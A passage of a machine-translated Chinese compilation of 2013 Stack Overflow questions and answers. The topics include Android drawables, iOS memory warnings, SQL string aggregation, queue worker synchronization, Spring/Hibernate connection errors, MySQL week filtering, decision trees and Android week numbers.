> 注意：您只需为位图文件（ 、 或 ）和九路径文件（ ）提供特定于密度的`.png`可`.jpg`绘制`.gif`对象`.9.png`。如果您使用 XML 文件来定义形状、颜色或其他[可绘制资源](http://developer.android.com/guide/topics/resources/drawable-resource.html)，则应在默认可绘制目录 ( `drawable/`) 中放置一份副本。
> 
> 要为不同密度创建替代位图可绘制对象，您应该遵循四个通用密度之间的**3:4:6:8 缩放比例。**例如，如果您有一个 48x48 像素的用于中等密度屏幕（启动器图标的大小）的可绘制位图，则所有不同的大小应该是：
> 
> *   36x36 用于低密度 (ldpi)
> *   48x48 用于中等密度 (mdpi)
> *   72x72 用于高密度 (hdpi)
> *   96x96 用于超高密度 (xhdpi)
> 
> 有关设计图标的更多信息，请参阅[图标设计指南](http://developer.android.com/guide/practices/ui_guidelines/icon_design.html)，其中包括各种位图可绘制对象的大小信息，例如启动器图标、菜单图标、状态栏图标、选项卡图标等。

有关有效支持多种屏幕尺寸的完整参考资料可以在[Android 开发者网站](http://developer.android.com/guide/practices/screens_support.html)上找到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:51:42.887

您应该使用 RelativeLayout 作为根视图。然后您可以指定 UI 元素之间的关系，如上、下等。使用 RelativeLayout 设计多个显示要容易得多

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2013-03-01T10:07:26.273

用良好的用户界面设计布局。您在其中创建文件夹`drawable`

```
1\. layout-large for the hdpi devices like google nexus
2\. layout-xlarge for the xhdpi devices like touchpads
3\. layout-small for the small devices less than medium devices 
```

并根据布局将它们与要设置字体大小的字段和元素对齐。要出现好的用户界面。

# iphone - iOS：检测主运行循环之外的低内存崩溃

> ID：15154641
> 
> 赞同：1
> 
> 时间：2013-03-01T09:42:03.790
> 
> 标签：iphone, ios, objective-c, memory-management, didreceivememorywarning

在我的一个应用程序中，我正在做很多涉及数组的计算并将它们绘制成图形。计算涉及用户输入，有时，如果用户输入疯狂的值，应用程序将继续执行计算，直到它占用太多内存并被杀死。当用户再次尝试打开应用程序时，它将尝试从上次保存的数据中进行相同的计算并再次崩溃。用户需要删除并重新下载应用程序才能恢复到默认值。

为了解决这个问题，我想在应用程序因内存不足而被终止时转储所有保存的数据。我已经尝试`applicationDidReceiveMemoryWarning:`在我`didReceiveMemoryWarning:`的 appDelegate 和进行计算的 viewController 中实现。这些函数都没有被调用。经过[一番研究](http://iphonedevsdk.com/forum/iphone-sdk-development/67122-didreceivememorywarning-not-being-called.html)，我发现这是因为我阻塞了主运行循环。

我怎样才能最好地处理这种情况？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:00:55.800

你基本上不应该阻塞主运行循环。您可以阻止*用户界面*（使用模式加载屏幕或类似屏幕），但如果您阻止主运行循环，您将面临各种问题。

有很多方法可以将您的工作转移到辅助线程 - 最简单/最高级别的选项之一是使用`performSelectorInBackground:`. 如果你需要更有限的控制，你可以使用`NSOperation`and `NSOperationQueue`，或者一直到 GCD （希望你不需要得到这个低级别）。

将工作放在辅助/后台线程上的另一个优点是，如果操作似乎花费太长时间，您可以让用户取消操作，也许可以通过“取消”按钮。当用户点击它时，您可以取消正在发生的操作，并避免这些内存警告首先发生。

**但是不要忘记**任何 UI 工作都需要在主线程上进行。因此，一旦完成处理，请确保在主线程上更新图形本身（使用`performSelectorOnMainThread`等）。

# sql - GROUP BY 组合/连接一列

> ID：15154644
> 
> 赞同：119
> 
> 时间：2013-03-01T09:42:15.667
> 
> 标签：sql, sql-server, sql-server-2008, group-by

我有一张如下表：

```
ID  User  Activity  PageURL  
 1  Me    act1      ab     
 2  Me    act1      cd     
 3  You   act2      xy     
 4  You   act2      st 
```

我想按用户和活动分组，这样我最终会得到类似的结果：

```
User  Activity  PageURL  
Me    act1      ab, cd     
You   act2      xy, st 
```

如您所见，PageURL 列组合在一起，并基于 group by 用逗号分隔。

非常感谢任何指示和建议。

* * *

## 回答 #1

> 赞同：200
> 
> 时间：2013-03-01T09:45:46.607

```
SELECT
     [User], Activity,
     STUFF(
         (SELECT DISTINCT ',' + PageURL
          FROM TableName
          WHERE [User] = a.[User] AND Activity = a.Activity
          FOR XML PATH (''))
          , 1, 1, '')  AS URLList
FROM TableName AS a
GROUP BY [User], Activity 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!3/467bd/4)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-01T12:01:25.087

> 一个好问题。应该告诉你破解这个需要一些时间。这是我的结果。

```
DECLARE @TABLE TABLE
(  
ID INT,  
USERS VARCHAR(10),  
ACTIVITY VARCHAR(10),  
PAGEURL VARCHAR(10)  
)

INSERT INTO @TABLE  
VALUES  (1, 'Me', 'act1', 'ab'),
        (2, 'Me', 'act1', 'cd'),
        (3, 'You', 'act2', 'xy'),
        (4, 'You', 'act2', 'st')

SELECT T1.USERS, T1.ACTIVITY,   
        STUFF(  
        (  
        SELECT ',' + T2.PAGEURL  
        FROM @TABLE T2  
        WHERE T1.USERS = T2.USERS  
        FOR XML PATH ('')  
        ),1,1,'')  
FROM @TABLE T1  
GROUP BY T1.USERS, T1.ACTIVITY 
```

# architecture - 同步队列工作者的访问

> ID：15154645
> 
> 赞同：1
> 
> 时间：2013-03-01T09:42:16.810
> 
> 标签：architecture, synchronization, queue, web-crawler, servicebus

我目前正在编写一个使用 Steam Web API 抓取 DotA 2 比赛的服务。因为我希望我的解决方案具有可扩展性，所以我希望允许同时缓冲和处理爬网作业。这就是为什么想到队列的原因：

![爬行架构](../Images/943b3b3077fd9d7b1ff8bc0d6801c246.png)

所有组件都应该能够在不同的计算机/VM 上运行（没有内存或进程间同步）。爬行作业可能是这样的：

```
Job 1: Crawl match 1234 with options ABC
Job 2: Crawl match 2345 with options BCD 
```

由于数据的性质，指向同一个比赛的多个工作可能会被排队（例如，两个玩家玩同一个游戏）。因此，我需要一些队列无法提供的同步机制（爬虫*不能同时*尝试写入相同匹配的数据）。

我的实际问题是：是否有一种模式可用于同步需要访问相同数据的队列工作人员？

我想到的一种方法是引入另一种允许爬虫进行`Lock`匹配的服务（这需要在从数据库读取或写入匹配数据之前完成）：

![爬行控制器](../Images/08ab2e0ba8963b298f64c8e2f54806ff.png)

但这会引入一大堆新的问题和要求：

*   如何缩放控制器？
*   如果控制器崩溃怎么办？
*   如果队列工作者没有解锁匹配怎么办？
*   ...

如果感兴趣，以下是我可能会使用的技术：

*   队列：Windows Server 的服务总线
*   服务：.NET Web API
*   数据库：SQL Server 2012

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:29:59.523

这听起来像一个预订系统，在线订票系统存在的那种问题 -

```
user asks for tickets
system offers specific tickets
user thinks a while and maybe pays, during that think time system cannot offer tickets to anyone else
eventually user buys, rejects or maybe just times out
system updates ticket availability 
```

问题：在您的系统中，如果两个具有相同参数的爬虫同时搜索，并且它们不能同时更新结果，是否会出现问题？我问的原因是我认为爬行动作本身类似于用户思考时间，这是一个长时间运行的动作，其持续时间持有数据库锁是不合理的。

我建议的方案是乐观锁定，由数据库和数据库事务调解，因此不需要单独的控制器 - 您的数据库是单点故障，最终是可伸缩性瓶颈，但您可以通过数据库的一些分区来解决这个问题.

你需要某种控制器。但它不必是单例。再次通过数据库锁调解实例。我看到的最大问题是可靠地捕获失败的爬虫。在“蓝天”场景中维护运行爬虫的数据库表很容易。在我看来，失败案例非常棘手。

我想知道诀窍是否是对数据库进行分区，每个分区对应一个具有自己控制器的“工作组”。只要控制器处于活动状态，它就可以启动工作并监管查询，以便在其工作组中不会发生重复。在任何爬虫完成后，一条“就绪”消息将排队，结果整合服务将数据从分区拉入主节点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:23:47.890

如果您需要关联队列中的一组/一组消息，您可以使用会话。此外，使用具有多个订阅的单个主题可能是基于订阅上设置的不同过滤器来划分消息的好方法。以下信息可能会有所帮助：

1.  （来自我的博客）[http://abhishekrlal.wordpress.com/2012/02/07/enterprise-integration-patterns-with-service-bus-part-1/](http://abhishekrlal.wordpress.com/2012/02/07/enterprise-integration-patterns-with-service-bus-part-1/)
2.  [http://code.msdn.microsoft.com/windowsazure/Brokered-Messaging-Session-41c43fb4](http://code.msdn.microsoft.com/windowsazure/Brokered-Messaging-Session-41c43fb4)

您可能需要将上述示例中的引用更新到 Azure SDK 1.8，因为它支持 Windows Server 的 Service Bus 1.0。

# ios - 在 Cocoa Touch 库中显示 UIWebView

> ID：15154648
> 
> 赞同：1
> 
> 时间：2013-03-01T09:42:25.597
> 
> 标签：ios, objective-c, cocoa-touch, oauth, uiwebview

我正在一个新的 Cocoa Touch 库中工作，我需要以编程方式显示 UIWebView，因为我将在外部网络中请求用户和密码（如 oAuth），但我不知道如何在 Cocoa Touch 中执行此操作图书馆。

示例代码：

**客户端.h**

```
#import <Foundation/Foundation.h>

@interface Client : NSObject

@property NSString *_aProperty;

- (void)showUIWebView:(NSURL*)urlToOpen;

@end 
```

**客户端.m**

```
#import "Client.h"

@implementation Client

@synthesize _identity;

- (void)showUIWebView:(NSURL*)urlToOpen
{        
   // I need to write code here to show the UIWebView :) 
}

@end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-06T14:58:42.777

我能够使用这样的代码来做到这一点：

```
UIApplication *app = [UIApplication sharedApplication];
UIWebView *web = [[UIWebView alloc] initWithFrame: CGRectMake(10, 40, 300, 300)];
NSURLRequest *req = [NSURLRequest requestWithURL: [NSURL URLWithString: @"http://yahoo.com"]];
[web loadRequest: req];
[app.keyWindow addSubview: web]; 
```

所以主要思想是将您的视图作为子视图添加到应用程序的 keyWindow 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T14:48:45.753

就我而言，您只能在内部显示 Cocoa-Touch 中的 UI 元素`UIViewControllers`——这看起来很合乎逻辑。

在您的方法中，您`NSObject`可以通过创建对它的引用来触发另一个方法，`UIViewController`然后此时将其添加到您的方法`UIView`中：

```
- (void)showUIWebView:(NSURL*)urlToOpen {        
UIViewController *myVC = [self.navigationController.viewControllers lastObject];
//This is your last view in the navigationController hierarchy.
UIWebView *newWebView = [[UIWebView alloc] initWithFrame:myVC.view.frame];
[myVC.view addSubview:newWebView];
} 
```

或者你可以从另一个`ViewController`你引用这个库的地方触发它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-10T03:44:34.200

我认为最简单的方法是让应用程序调用到您的库中提供一个超级视图，然后您可以将您的子视图添加到其中：

```
@interface ChemitaxisLibrary
typedef void (^ChemitaxisLibraryLoginCompletionBlock)(BOOL loggedIn);
- (void)loginWithinSuperview:(UIView*)superView completion:(ChemitaxisLibraryLoginCompletionBlock)completion;

@end 
```

这将要求您的代码用户在他们的应用程序中提供他们愿意允许您放置 UIWebView* 实例的位置。

（带有指示成功或失败的 BOOL 的完成块允许您的库根据需要操作 web 视图，当您到达可以报告成功或失败的地方时，完成句柄将为您提供一种方法来执行此操作。 )

一旦你有了这个，在他们传递的超级视图中添加你的 UIWebView 可以像你想要的那样简单或复杂。你可以接管整个框架，或者你可以占据一个角落，或者你可以是动态的，并根据他们给你的 superView 的大小来决定做什么。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T11:32:22.090

你应该这样做。

您必须将 Frame 替换为与您添加到的视图相对应的 Web 视图的 x、y、宽度、高度，并将 self.view 替换为存储父视图的变量。

例如，如果您想将其添加到根视图（窗口），您可以将 self.view 替换为 [[UIApplication sharedApplication] keyWindow]。

```
- (void)showUIWebView:(NSURL*)urlToOpen {
    UIWebView *webView = [[UIWebView alloc] initWithFrame:CGRectMake(0.0f, 0.0f, 320.0f, 460.0f)]; // WebView Location & Dimensions
    [webView loadRequest:[NSUrlRequest requestWithURL:urlToOpen]];

    [self.view addSubView:webView]; // Where self.view is the view you wish to add the Web View to.
} 
```

# backbone.js - Backbone.js - 在 Safari 中显示视图的问题

> ID：15154650
> 
> 赞同：0
> 
> 时间：2013-03-01T09:42:40.353
> 
> 标签：backbone.js, mobile-safari

我有一个应用程序，旨在重新创建一个标准网站，包括标准页面和一个列出类别和文章的新闻模块。当您访问新闻时，会显示来自新闻页面的内容，以及类别列表或文章列表。在这种情况下，当您查看新闻页面时，将显示 (2) 类别。

在 Chrome、Firefox 和 IE 上，我可以在我的页面之间单击并返回新闻 - 进入类别、项目列表，然后是文章，然后毫无问题地返回主条目新闻页面。视图（用于主入口页面）始终显示正确的 HTML。但是，在 Windows 和 ipad 上的 Safari 中，虽然一切正常，但最终（或有时更快！），新闻条目页面上应该显示类别的 HTML 不显示。更令人沮丧的是，问题是断断续续的——我可以点击返回其他页面，然后返回新闻，现在正在显示类别 HTML！控制台从我的安静调用中显示正确的响应和 HTML：

```
[{"id":"22","indexID":"general", "name":"General"},{"id":"23","indexID":"newnewscat","name":"New News Cat"}] 
```

只是我的视图没有显示 HTML。

在我的路由器中，我有 "news/:indexID":"getNews"

getNews 函数是

```
getNews:function(indexID) {
if (indexID == "index") {
    this.getPage("news"); // display cms info for news page eg title and long desc
    // do we show categories or listings?
    var type = this.showItemListingOrCategories("news"); 
    if (type.showCats == 1) {
        // show cat listings 
        var newsCategories = new App.Collection.NewsCategory();
        newsCategories.fetch({
            success:function() {
                var newsCategoryListing = new App.View.NewsCategoryListing({collection:newsCategories});
                newsCategoryListing.render(".span9");
            }
        })  
    }
    else {
        // show item listings 
        var newsItems = new App.Collection.NewsItem([],{indexID:indexID});
        newsItems.fetch({
            success:function() {
                var newsItemListing = new App.View.NewsItemListing({collection:newsItems}); 
                newsItemListing.render({element:".span9",type:"page"});
            }
        });     
    }
} 
```

}

newsCategoryListing 视图是

```
App.View.NewsCategoryListing = Backbone.View.extend({
    tagName: "table",
    className:"catListing",
    render:function($element){console.log("hello");this.collection.each(function(newsCategory) {
            this.$el.append(new App.View.NewsCategoryItem({model:newsCategory}).render().el).appendTo($element);    
        },this);          
        return this; 
```

});

我在上面的渲染函数中添加了一个 console.log("hello") - 当无法显示类别列表的 html 时，它会正确显示。

我希望这是足够的信息——还有其他人对 Safari 有类似的问题吗？

非常感谢

# spring - Spring-Hibernate 应用程序：非法访问：此 Web 应用程序实例已停止

> ID：15154652
> 
> 赞同：11
> 
> 时间：2013-03-01T09:42:46.683
> 
> 标签：spring, hibernate, tomcat7, connection-pooling

我正在以适当的方式处理连接。
**1.**我在我的应用程序中使用“休眠”连接池。每当我从池中获得连接时，我都会在完成事务后返回池。
**2.**我已经监控数据库检查连接。我将“空闲连接”时间设置为 60 秒。我发现没有连接对象运行超过 60 秒。

我仍然经常收到此错误。我的网络应用程序正在停止。我必须每天重新启动一次tomcat。但是，我正在寻找一个无需重新启动 tomcat 的永久解决方案。
任何人都可以解释根本原因吗？这样我就可以解决这个问题。

**错误日志：**

```
INFO: Illegal access: this web application instance has been stopped already.  Could not load com.mchange.v2.c3p0.ComboPooledDataSourceBeanInfo.  The eventual following stack trace is caused by an error thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access, and has no functional impact.
java.lang.IllegalStateException
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1587)
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1546)
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Class.java:264)
    ...
    ...
    ...
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:679) 
```

**我的休眠连接.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<beans  xmlns="http://www.springframework.org/schema/beans" 
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:p="http://www.springframework.org/schema/p" 
        xmlns:tx="http://www.springframework.org/schema/tx"
        xmlns:context="http://www.springframework.org/schema/context"
        xsi:schemaLocation="
            http://www.springframework.org/schema/beans 
            http://www.springframework.org/schema/beans/spring-beans-3.1.xsd
            http://www.springframework.org/schema/tx 
            http://www.springframework.org/schema/tx/spring-tx-3.1.xsd
            http://www.springframework.org/schema/context
            http://www.springframework.org/schema/context/spring-context-3.1.xsd
            ">

    <context:property-placeholder location="/WEB-INF/spring.properties" />

    <!-- Enable annotation style of managing transactions -->
    <tx:annotation-driven transaction-manager="transactionManager" />   

    <!-- Declare the Hibernate SessionFactory for retrieving Hibernate sessions -->
    <!-- See http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/orm/hibernate3/annotation/AnnotationSessionFactoryBean.html -->                           
    <!-- See http://docs.jboss.org/hibernate/stable/core/api/index.html?org/hibernate/SessionFactory.html -->
    <!-- See http://docs.jboss.org/hibernate/stable/core/api/index.html?org/hibernate/Session.html -->
    <bean id="sessionFactory" class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean"
                 p:dataSource-ref="dataSource"
                 p:configLocation="${hibernate.config}"
                 p:packagesToScan="com.turborep.turbotracker"/>

    <!-- Declare a datasource that has pooling capabilities-->   
    <bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"
                destroy-method="close"
                p:driverClass="${app.jdbc.driverClassName}"
                p:jdbcUrl="${app.jdbc.url}"
                p:user="${app.jdbc.username}"
                p:password="${app.jdbc.password}"
                p:acquireIncrement="5"
                p:idleConnectionTestPeriod="60"
                p:maxPoolSize="100"
                p:maxStatements="50"
                p:minPoolSize="0" />

    <!-- Declare a transaction manager-->
    <bean id="transactionManager" class="org.springframework.orm.hibernate3.HibernateTransactionManager" 
                p:sessionFactory-ref="sessionFactory" />

</beans> 
```

**Edit1：**
我今天又遇到了一个错误。这是日志：

```
[ERROR] [ajp-bio-8009-exec-4 08:27:13] (JDBCExceptionReporter.java:logExceptions:234) Connections could not be acquired from the underlying database!
[ERROR] [ajp-bio-8009-exec-4 08:27:13] (JDBCExceptionReporter.java:logExceptions:234) Connections could not be acquired from the underlying database!
[ERROR] [ajp-bio-8009-exec-4 08:27:13] (JobServiceImpl.java:getRxmasterID:4399) Cannot open connection
org.hibernate.exception.GenericJDBCException: Cannot open connection
    at org.hibernate.exception.SQLStateConverter.handledNonSpecificException(SQLStateConverter.java:140)
    at org.hibernate.exception.SQLStateConverter.convert(SQLStateConverter.java:128)
    ...
    ...
    ... 
    at com.mchange.v2.resourcepool.BasicResourcePool.checkoutResource(BasicResourcePool.java:477)
    at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:525)
    ... 50 more 
```

我如何使用连接的示例代码：

```
@Resource(name="sessionFactory")
private SessionFactory itsSessionFactory;

@Override
public List<Userloginclone> getAllUserList() {
    itsLogger.debug("Retrieving all user list");
    Session aSession = null;
    List<Userloginclone> aQueryList = null;
    try {
        aSession = itsSessionFactory.openSession();
        Query aQuery = aSession.createQuery("FROM  Userloginclone");
        aQueryList = aQuery.list();
    } catch (Exception e) {
        itsLogger.error(e.getMessage(), e);
    } finally {
        aSession.close();
    }
    return  aQueryList;
} 
```

**如果我做错了什么，请纠正我。**

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-04T09:32:20.347

您面临的问题与数据库连接无关。

我猜你重启tomcat并且不重新部署应用程序时不会遇到这个问题，对吧？

它的原因是在tomcat中重新部署应用程序。每次重新部署应用程序时，都会创建一个 Web 应用程序的新实例并停止旧实例。以前的应用程序可能在某处加载了旧类，或者应用程序未正确取消部署。

你在tomcat/lib中有一些jar吗？你能展示 JobQuoteFormController 和 JobServiceImpl 类吗？

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-07T05:58:40.420

首先，您可能想使用 Spring 的事务管理器和 Hibernate 的`OpenSessionInViewFilter`来管理 Session 和事务管理。有了这两个，您不必担心管理连接，并且可以使用`itsSessionFactory.getCurrentSession()`.

接下来，您可能应该添加`p:testConnectionOnCheckout="true"`到您的`dataSource`bean。

您的应用程序发生的情况是，一旦连接失效，它就会保持失效状态。这将允许重新启动死连接。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-10-09T02:03:25.650

1.  `service tomcat stop`

2.  `ps -ef|grep java` # 查看java进程并全部kill掉

3.  `service tomcat start`# 然后它工作

PS：你可以看看登录`tomcat/logs/catalina.out`和`localhost-2018....log`

# mysql - MySQL 在最后一个工作周内获取记录

> ID：15154655
> 
> 赞同：1
> 
> 时间：2013-03-01T09:42:56.540
> 
> 标签：mysql, week-number

我正在使用

```
 WHERE WEEK(curdate,3)-WEEK(date)=1 
```

获取在最后一个工作周（周一至周日）记录的表的所有行。全年运行良好，但在一月份会在一段时间内返回 0，所以我必须采取

```
 WHERE WEEK(curdate,3)+53-WEEK(date) 
```

在这种情况下。我不能使用`OR`，因为当两者都存在时，它将同时使用当前年份信息和去年信息。我已经尝试过`COALESCE`和`IFNULL`方法：

```
 WHERE COALESCE(
     (WEEK(curdate(),3)-WEEK(date,3) = 1),
     (WEEK(curdate(),3)+53-WEEK(date,3) = 1
 ) 
```

它全年运作良好，但在`IFNULL`真实情况下无法处理。请给我关于如何有效处理此案的建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:56:40.140

您可以使用以下方法获取本周星期一的日期：

```
select SUBDATE(curdate(), WEEKDAY(curdate())); 
```

然后在谓词中使用本周星期一和前一周星期一的日期：

```
WHERE date >= SUBDATE(curdate(), WEEKDAY(curdate())) - interval 1 week
AND date < SUBDATE(curdate(), WEEKDAY(curdate())) 
```

# python - 用于返回下一个特征以拆分树的决策树实现

> ID：15154658
> 
> 赞同：3
> 
> 时间：2013-03-01T09:43:04.953
> 
> 标签：python, filter, machine-learning, scikit-learn, decision-tree

假设我的数据由水果组成，由它们的颜色和形状以及更多特征来描述。我想返回最多具有用户所述功能的 X 水果，并且我想在最少的问题中做到这一点。

我总是问用户的第一个问题是水果的颜色和形状是什么。根据用户的回答，我想要求 K 更多特征，如纹理大小剥离类型等。我希望 K 是返回最准确 X 结果的最小 num 因此我想知道下一个特征是什么我应该问用户。我的数据库由分类为特征（任意值）的水果组成。

是机器学习问题吗？我应该使用什么算法以及应该使用哪种实现。我试图在 scikit-learn、nltk、weka 中寻找合适的算法来回答这个问题。要么这些算法不适合回答这个问题，要么我需要更具体的指导来使用它们。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:52:14.920

是的。

决策树将点投影到每个特征上并找到最佳分割。这种分割可以通过不同的指标来确定，例如：基尼指数或熵（信息增益） Sci-kit learn 在[sklearn.tree中有这个](http://scikit-learn.org/stable/modules/classes.html#module-sklearn.tree)

假设您有 5 个数据点：

```
 color   shape   fruit
 orange  oblong  orange
 red     round   apple
 orange  round   orange
 red     oblong  apple
 red     round   apple 
```

所以要训练你会做这样的事情：

```
feature   class  |  feature  class
orange    orange |  oblong   orange
red       apple  |  round    apple
orange    orange |  round    orange
red       apple  |  oblong   apple
red       apple  |  round    apple 
```

正如你所看到的，最好的分割是颜色，因为对于这个数据集，如果颜色=红色，那么水果=苹果，如果颜色=橙色，那么水果=橙色。

在这些数据点上进行训练，您将拥有决策树：

```
 color
___________________
|                 |
|                 |
red               orange
apple             orange 
```

在现实生活中，这些拆分将基于数值，即`num > .52`.

至于为此使用什么算法，这取决于。您必须对自己的数据进行研究，因为它更像是每个数据集/偏好类型的东西。

您可以像这样在上面的示例中使用 sci-kit learn：

```
from sklearn.trees import DecisionTreeClassifier
#make your sample matrix 
samples = [[1,1], [0,0], [1,0], [0,1], [0,0]]
#make your target vector ( in this case fruit)
fruitname = [1, 0, 1, 0, 0]
#create and fit the model
dtree =  DecisionTreeClassifier()
dtree =  dtree.fit(samples, fruitname)
#test an unknown red fruit that is oblong
dtree.predict([0,1]) 
```

注意 color=1 表示水果是橙色的，shape=1 表示水果是长方形的。

查看 sci-kit[用户指南](http://scikit-learn.org/stable/modules/tree.html)以获得更深入的概述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:48:20.547

是的，这是一个机器学习问题（在某种程度上）。我建议使用有许多不同算法的[决策树方法。](http://en.wikipedia.org/wiki/Decision_tree_learning)[ID3](http://en.wikipedia.org/wiki/ID3_algorithm)和[C4.5](http://en.wikipedia.org/wiki/C4.5_algorithm)是简单的算法，可帮助您最小化深度，因为它将下一个问题（拆分树的下一个特征）基于最大[信息增益](http://en.wikipedia.org/wiki/ID3_algorithm#Information_Gain)。

# listview - 如何在黑莓中创建类似日历的 ListView 或 TableView

> ID：15154659
> 
> 赞同：0
> 
> 时间：2013-03-01T09:43:05.470
> 
> 标签：listview, blackberry, view, calendar, tableview

我如何在黑莓中创建一个类似于日历的视图，并且每个列表都有不同的颜色（例如：奇数行为蓝色，偶数行为白色）。

我想要一个像下面这样的结构

正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文字文字 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 正文 | 文本

其他示例，例如此链接中的图像-> [http://appworld.blackberry.com/webstore/content/14535/](http://appworld.blackberry.com/webstore/content/14535/)

我使用黑莓 jde 4.7。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:43:56.600

尝试这个 -

```
int k;
LabelField l;

GridFieldManager grid = new GridFieldManager(9,4,0); //First parameter for row,second for column
    for (int i = 1; i < 37; i++) {
        k=i%2;
         if(k!=0){
             l=new LabelField(""+i)
             {
                 public void paint(Graphics graphics)
                 {
                 graphics.setColor(Color.RED);
                 super.paint(graphics);
                 }
             } ;
         }else{
             l=new LabelField(""+i)
             {
                 public void paint(Graphics graphics)
                 {
                 graphics.setColor(Color.BLUE);
                 super.paint(graphics);
                 }
             } ;
         }

         grid.add(l);

    }
     grid.setColumnPadding(30);
     grid.setRowPadding(30);
     add(grid); 
```

# asp.net - 已部署的 Asp.Net 应用程序使操作中止（来自 hresult 0x80040e14 (E_ABORT) 的异常）

> ID：15154666
> 
> 赞同：0
> 
> 时间：2013-03-01T09:43:21.877
> 
> 标签：asp.net, exception, outlook

我有一个我正在发送邮件的 asp.net 应用程序，其中包含存储在本地驱动器中的文件的附件。编写的代码通过使用 Outlook com 对象发送邮件来发送邮件。因为代码在客户端（没有错误工作正常），但我将应用程序部署到远程服务器中，出现错误“操作中止（来自 hresult 0x80040e14 (E_ABORT) 的异常）”。我在网上尝试过，寻找解决方案，但任何一种解决方案都不能解决我的问题。

编写的代码是

```
 string ticks = DateTime.Now.Ticks.ToString();

 Outlook.Application objOutlook = new Outlook.Application();
            objOutlook.ActiveExplorer();
            //application.Visible = true;

            Outlook.Application outlookApp = new Outlook.Application();

            Outlook.MailItem message = (Outlook.MailItem)outlookApp.CreateItem(Outlook.OlItemType.olMailItem);

            message.Subject = "Test PPT";

            message.Body = " find Test PPT attached tp this mail";

            //message.Recipients.Add("MyMailID@gmail.com");

            message.Body = "Please find Test PPT attached tp this mail";

            message.Attachments.Add(@"D:\TempFiles\AttachedPPT" + ticks + ".pptx", message.Body.Length + 1, Outlook.OlAttachmentType.olByValue, "MyAttachment");

            message.Display(false); 
```

有没有人告诉我为什么只在部署到远程服务器时出错。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T04:41:27.867

Microsoft 目前不推荐也不支持任何无人值守、非交互式客户端应用程序或组件（包括 ASP、ASP.NET、DCOM 和 NT 服务）的 Microsoft Office 应用程序自动化，因为 Office 可能表现出不稳定的行为和/或在此环境中运行 Office 时出现死锁。

欲了解更多信息[链接](http://support.microsoft.com/kb/257757)

# android - 如何计算给定日期Android的周数

> ID：15154673
> 
> 赞同：6
> 
> 时间：2013-03-01T09:43:48.013
> 
> 标签：android, calendar, week-number

我正在尝试从给定日期获取当前周数。即，如果我输入日期为 01/03/2013，那么我应该得到周数，即 9..

请帮助我找到解决方案..

谢谢..

阿布舍克..

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-01T09:46:31.363

您可以为该日期创建一个日历对象并使用 calendar.get(Calendar.WEEK_OF_YEAR) 获取星期。此处描述了 API：http: [//developer.android.com/reference/java/util/Calendar.html#WEEK_OF_YEAR](http://developer.android.com/reference/java/util/Calendar.html#WEEK_OF_YEAR)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-01T10:09:03.737

```
 Calendar calender = Calendar.getInstance();
    Log.d("Current Week:" + calender.get(Calendar.WEEK_OF_YEAR)); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-01T09:47:07.740

```
Calendar sDateCalendar = new GregorianCalendar(2013,03,01);
Calendar.getInstance().get(Calendar.WEEK_OF_YEAR); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-01-30T07:17:37.623

01/03/2013 记为 113 , 2 ,1

```
 Date d = new Date(113, 2, 1);

            Calendar c = Calendar.getInstance();

            c.setTime(d);

            int weekOfYear = c.get(Calendar.WEEK_OF_YEAR); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-07T08:43:21.947

日历日历 = Calendar.getInstance(); Log.d("当前周：" + calender.get(Calendar.WEEK_OF_YEAR));

# adobe-indesign - IDML：以正确的顺序提取文本内容

> ID：15154675
> 
